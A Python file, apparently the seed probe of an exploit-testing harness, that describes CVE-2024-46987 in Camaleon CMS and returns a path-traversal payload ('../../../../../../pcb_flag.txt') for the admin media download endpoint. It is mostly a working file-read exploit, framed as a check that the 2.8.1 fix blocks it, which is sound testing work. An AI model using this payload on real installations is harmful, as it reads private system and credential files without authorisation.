#!/usr/bin/env python3
"""[GIVEN to the method] Original CVE-2024-46987 path traversal in Camaleon CMS.

An authenticated low-privilege ('client') user hits the admin media endpoint

    GET /admin/media/download_private_file?file=../../../../../../pcb_flag.txt

The controller builds  fetch_file("private/#{params[:file]}")  and send_file's the result.
On the LOCAL uploader (CamaleonCmsLocalUploader) this reads an arbitrary local file via the
`../` traversal. Fixed in 2.8.1: LocalUploader#fetch_file rejects any name containing '..'.

This is the seed exploit: it READS the flag on V0 (2.8.0) and is BLOCKED on V1 (2.8.1).
"""
from __future__ import annotations

# Traversal escapes /build/app/private up to '/', reading the planted canary /pcb_flag.txt
# (stands in for the advisory's /etc/passwd). Six `..` clamp at filesystem root.
TRAVERSAL = "../../../../../../pcb_flag.txt"


def candidate() -> dict:
    """The seed probe: the SAME `../` traversal, driven against the LOCAL uploader backend."""
    return {
        "probe_id": "cve-2024-46987-local-traversal",
        "backend": "local",
        "endpoint": "/admin/media/download_private_file",
        "param": "file",
        "payload": TRAVERSAL,
    }
